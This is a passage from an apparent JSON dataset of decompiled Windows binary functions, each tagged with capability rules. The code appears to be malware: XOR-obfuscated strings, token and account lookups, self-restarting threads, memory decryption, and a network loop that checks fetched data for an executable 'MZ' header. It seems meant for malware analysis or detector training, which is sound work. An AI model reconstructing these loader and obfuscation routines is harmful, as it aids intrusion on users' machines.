= (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x406234;\n        fcn.00406705();\n        iStack552 = *0x41cb24;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41cae0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41cb24, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cb24, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004061d9, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41cb24);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 720
    },
    "00406688": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406688(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41cad8);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 359
    },
    "00406705": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406705(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    code *pcVar8;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint ARG_0;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t ProcessHandle;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *dwProcessId;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    uint TokenInformationLength;\n    int32_t TokenHandle;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_3ch = 0x104;\n    var_14h = puVar3;\n    uVar2 = (*pcVar7)(8, 0x208);\n    var_ch = (*pcVar8)(uVar2);\n    TokenInformationLength = 0;\n    var_38h = 0x104;\n    var_30h = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (ProcessHandle != 0) {\n            var_6ch = 0x38182638;\n            var_68h = 0x28100a;\n            var_64h = 0x230d0923;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_60h = 0xb1b2c24;\n            var_5ch = 0x19273e;\n            var_58h = 0x4d273409;\n            var_4ch = 0x4d495162;\n            var_48h._0_2_ = CONCAT11(var_48h._1_1_, 0x6f);\n            uVar2 = (*pcVar7)(8, 0x19);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            var_24h = iVar4;\n            var_10h = &var_6ch - iVar4;\n            do {\n                var_20h = 5;\n                puVar1 = iVar6 + iVar4;\n                iVar5 = iVar6 % 5;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_4ch + iVar5) ^ puVar1[&var_6ch - iVar4];\n            } while (iVar6 < 0x18);\n            iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x20008, &TokenHandle);\n            if ((iVar6 != 0) || (pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap,  TokenHandle == 0)) {\n                var_60h = 0xb452c32;\n                var_5ch = 0x7b6a1413;\n                var_58h = 0x141a0119;\n                var_54h._0_2_ = CONCAT11(var_54h._1_1_, 0x59);\n                var_4ch = 0x65374959;\n                var_48h._0_2_ = 0x7876;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                var_10h = 6;\n                var_20h = iVar6;\n                iVar4 = 0;\n                do {\n                    puVar1 = iVar4 + iVar6;\n                    iVar5 = iVar4 % 6;\n                    iVar4 = iVar4 + 1;\n                    *puVar1 = *(&var_4ch + iVar5) ^ puVar1[&var_60h - iVar6];\n                } while (iVar4 < 0xd);\n                var_40h = fcn.00406d62();\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (var_40h != 0) {\n                    var_60h = 0x1f460461;\n                    var_5ch = 0x3c5b530f;\n                    var_58h = 0x4b080e41;\n                    var_54h._0_2_ = CONCAT11(var_54h._1_1_, 0x37);\n                    dwProcessId = 0x6b346d37;\n                    var_18h._0_2_ = 0x327a;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_4ch = iVar4;\n                    do {\n                        puVar1 = iVar6 + iVar4;\n                        iVar5 = iVar6 % var_10h;\n                        iVar6 = iVar6 + 1;\n                        *puVar1 = *(&dwProcessId + iVar5) ^ puVar1[&var_60h - iVar4];\n                    } while (iVar6 < 0xd);\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar6 = var_20h;\n                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                              (TokenHandle, 1, dwProcessId, TokenInformationLength, \n                                               &TokenInformationLength);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_14h, &var_3ch, var_ch, &var_38h, &var_50h);\n                                if (iVar5 != 0) {\n                                    var_78h = 0x4c316d10;\n                                    var_74h = 0x6d106b07;\n                                    var_70h = 0x6b1b4c3d;\n                                    var_6ch = 0x4c4e6d0d;\n                                    var_68h = 0x6d1f6b08;\n                                    var_64h = 0x6b274c51;\n                                    var_60h = 0x4c516d1f;\n                                    var_5ch = 0x6d1f6b27;\n                                    var_58h = 0x6b304c51;\n                                    var_54h._0_2_ = 0x6d43;\n                                    var_30h = 0x4c746d43;\n                                    var_2ch._0_2_ = 0x6b54;\n                                    uVar2 = (*pcVar7)(8, 0x4d);\n                                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar6 = 0;\n                                    do {\n                                        puVar1 = iVar6 + iVar4;\n                                        iVar5 = iVar6 % var_10h;\n                                        iVar6 = iVar6 + 1;\n                                        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_78h - iVar4];\n                                    } while (iVar6 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar4, var_ch, var_14h, var_40h);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_30h = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    iVar6 = var_20h;\n                                    iVar4 = var_4ch;\n                                }\n                            }\n                            uVar2 = (*pcVar7)(0, dwProcessId);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        }\n                    }\n                    uVar2 = (*pcVar7)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                iVar4 = var_24h;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                uVar2 = (*pcVar7)(0, iVar6);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            uVar2 = (*pcVar7)(0, iVar4);\n            (*pcVar8)(uVar2);\n            puVar3 = var_14h;\n        }\n        uVar2 = (*pcVar7)(0, var_ch);\n        (*pcVar8)(uVar2);\n        uVar2 = (*pcVar7)(0, puVar3);\n        (*pcVar8)(uVar2);\n        uVar2 = var_30h;\n    }\n    return uVar2;\n}\n",
        "token_count": 2479
    },
    "00406aad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406aad(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_32ch;\n    uint var_124h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &var_124h;\n    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &var_32ch;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    if (*0x41cb14 == 0) {\n        uVar5 = 0;\n        do {\n            if (*(uVar5 + 0x410370) == arg_ch) {\n                if (arg_10h == *0x41caec) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar10 = &var_124h;\n                    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = 0;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_124h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar6 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar6, &var_124h, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n                    }\n                    pcVar4 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_124h);\n                    if (iVar6 != 0) {\n                        (*pcVar4)(&var_124h);\n                        iVar6 = fcn.00403b18();\n                        if (iVar6 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar6 = fcn.004088cf();\n                if (iVar6 != 0) {\n                    return 1;\n                }\n                puVar10 = &var_32ch;\n                for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                iVar6 = fcn.00406705();\n                if (iVar6 == 0) {\n                    return 1;\n                }\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_32ch, 0x41cb28);\n                if (iVar6 != 0) {\n                    return 1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406e40, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                return 1;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar6 = fcn.004088cf(),  iVar6 == 0)) && (iVar6 = fcn.00406705(),  iVar6 != 0)\n             ) && (iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_32ch),  pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap\n                  ,  iVar2 == 0)) {\n        var_18h = 0xb452c32;\n        var_14h = 0x7b6a1413;\n        var_10h = 0x141a0119;\n        var_ch._0_1_ = 0x59;\n        var_8h = 0x65374959;\n        var_4h._0_2_ = 0x7876;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        var_20h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        var_1ch = &var_18h - var_20h;\n        do {\n            puVar1 = iVar6 + var_20h;\n            iVar7 = iVar6 % 6;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_8h + iVar7) ^ puVar1[var_1ch];\n        } while (iVar6 < 0xd);\n        var_14h = 0xd07253b;\n        var_10h = 0x1617053c;\n        var_ch._0_1_ = 99;\n        var_8h = 0x4c63417a;\n        var_4h._0_2_ = 0x6a48;\n        uVar3 = (*pcVar4)(8, 10);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = var_20h;\n        iVar9 = 0;\n        do {\n            puVar1 = iVar9 + iVar7;\n            iVar8 = iVar9 % 6;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_14h - iVar7];\n        } while (iVar9 < 9);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_20h, iVar7);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        (*pcVar4)(&var_32ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        *(iVar9 + 8) = arg_10h;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004061d9, iVar9, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*pcVar4)(uVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1716
    },
    "00408a55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a55(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41cb14 == 0) {\n        *0x41cb24 = fcn.00405c78();\n        uVar6 = *0x41cb20;\n        iVar8 = *0x41cb1c;\n    }\n    else {\n        *0x41cb24 = fcn.00406f18();\n        iVar5 = fcn.0040590a(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x00408b0e;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x00408b0e:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41cb24 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.00406705();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040db44();\n            fcn.00402271((*0x41cadc & 1) << 4);\n        }\n        uStack576 = *0x41cb24;\n        uStack572 = *0x41cae0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(5000);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cb24, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408a55, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41cb24);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 981
    },
    "00408ec8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408ec8(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41cb14 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41cae0, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41cb28;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00406705();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408a55, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x412300) = *(uVar5 + 0x412300) ^ \"jRlV6mNlxd8KrC\"[uVar5 % 0xe];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x416700) = *(uVar5 + 0x416700) ^ *(uVar5 % 0xd + 0x41c900);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004064db, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41cb18 == 0) {\n        fcn.0040a831();\n        if (*0x41cb14 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 674
    },
    "0040901a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040909f)\n// WARNING: Removing unreachable block (ram,0x004090af)\n// WARNING: Removing unreachable block (ram,0x004090bc)\n// WARNING: Removing unreachable block (ram,0x004090cb)\n// WARNING: Removing unreachable block (ram,0x004090d0)\n// WARNING: Removing unreachable block (ram,0x004090da)\n// WARNING: Removing unreachable block (ram,0x004090e4)\n// WARNING: Removing unreachable block (ram,0x0040913d)\n// WARNING: Removing unreachable block (ram,0x00409159)\n// WARNING: Removing unreachable block (ram,0x00409268)\n// WARNING: Removing unreachable block (ram,0x00409284)\n// WARNING: Removing unreachable block (ram,0x004092d6)\n// WARNING: Removing unreachable block (ram,0x004092b4)\n// WARNING: Removing unreachable block (ram,0x004092d8)\n\nuint __cdecl fcn.0040901a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    \n    puVar2 = 0x41cd30;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004096b2();\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    while (*0x41cb18 == 0) {\n        fcn.004096b2();\n        iVar1 = fcn.00409401();\n        if (iVar1 != 0) {\n            fcn.0040b27a();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return 0;\n}\n",
        "token_count": 406
    },
    "00409401": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00409401(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint8_t *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_74h = *0x41cd3c;\n    var_70h = *0x41cd40;\n    var_5ch = 0x32255224;\n    var_58h = 0x2e572310;\n    var_54h = 0x5c2e1f3f;\n    var_50h = 0x351a382b;\n    var_4ch = 0x1253441;\n    var_48h = 0x2e314630;\n    var_44h = 0x6b1e3f0c;\n    var_40h = 0x3774409;\n    var_3ch = 0x72436372;\n    var_38h = 0x75667f08;\n    var_8h = 0x56463045;\n    var_4h._0_1_ = 0x75;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_68h = 5;\n    var_10h = puVar4;\n    iVar9 = 0;\n    var_14h = &var_5ch - puVar4;\n    do {\n        puVar7 = puVar4 + iVar9;\n        iVar6 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar7 = *(&var_8h + iVar6) ^ puVar7[&var_5ch - puVar4];\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_14h = 0;\n    var_ch = str.QQIEQ4_;\n    do {\n        var_8h = 0;\n        var_6ch = 0;\n        iVar9 = 0;\n        uVar5 = var_ch[var_14h] << 8;\n        var_64h = 1;\n        do {\n            if (uVar5 >> 8 != '\\0') {\n                puVar7 = puVar4;\n                for (uVar5 = uVar5 & 0xffffff00 | *puVar4; uVar5 != uVar5 >> 8; uVar5 = uVar5 & 0xffffff00 | *puVar7) {\n                    if (uVar5 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040950a;\n                    }\n                    puVar7 = puVar7 + 1;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x0040950a:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_34h = 0x17384b55;\n            var_30h = 0x3b500923;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_2ch = 0x1c556506;\n            puVar10 = &var_24h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h._0_2_ = 0x722c;\n            var_1ch = 0x7248397a;\n            var_18h._0_1_ = 0x51;\n            uVar3 = (*pcVar2)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_64h = &var_34h - iVar9;\n            do {\n                puVar4 = iVar6 + iVar9;\n                iVar8 = iVar6 % var_68h;\n                iVar6 = iVar6 + 1;\n                *puVar4 = *(&var_1ch + iVar8) ^ puVar4[var_64h];\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_74h);\n            iVar6 = fcn.0040d1de(0, &ARG_0, &var_6ch, &var_8h);\n            if (iVar6 == 0) {\n                if (var_6ch == 0) {\n                    fcn.0040b27a();\n                    uVar3 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    break;\n                }\n                if (var_24h < var_6ch) {\n                    fcn.0040b27a();\n                    var_70h = var_70h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_70h % 600000 + 60000);\n                }\n                else if (((4 < var_6ch) && (var_6ch == var_24h)) &&\n                        ((var_20h != NULL && ((*var_20h == 'M' && (var_20h[1] == 'Z')))))) {\n                    